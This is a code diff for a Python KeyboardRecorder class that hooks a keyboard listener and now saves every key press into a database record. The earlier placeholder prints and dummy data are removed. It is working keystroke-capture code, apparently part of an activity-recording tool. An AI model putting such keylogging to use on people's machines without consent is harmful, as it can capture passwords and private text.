@@ -5,7 +5,11 @@ from threading import Lock
 
 class KeyboardRecorder(RecordedData):
 		def __init__(self, isAutoRecord):
+			RecordedData.__init__(self)
 			self.isAutoRecord = True
+			self._keystroke_data = self.get_recorded_data()
+			self._keystroke_data['name'] = "Keystroke"
+			self._keystroke_data['data'] = ''
 			self.listener = keyboard.Listener(
 				on_press=self.on_press
 			)
@@ -33,21 +37,9 @@ class KeyboardRecorder(RecordedData):
 
 		def on_press(self, key):
 				if self.checkrecording():
-					try:
-							print('alphanumeric key {0} pressed'.format(
-									key.char))
-							self.post = {
-								"_id": "333",
-								"name": "Keystroke",
-								"Date": "9/11/2111",
-								"IP Address": "1.1.1.1",
-								"Keystroke": key.char
-							}
-							# self.save_recorded_data({"Keystroke": key.char, "name": "Keystroke"})
-					except AttributeError:
-							print('special key {0} pressed'.format(
-									key))
-
+					self._keystroke_data['data'] = format(key)
+					self.insert_to_db(self._keystroke_data)
+					# print(format(key))
 
 		def on_release(self, key):
 				print('{0} released'.format(
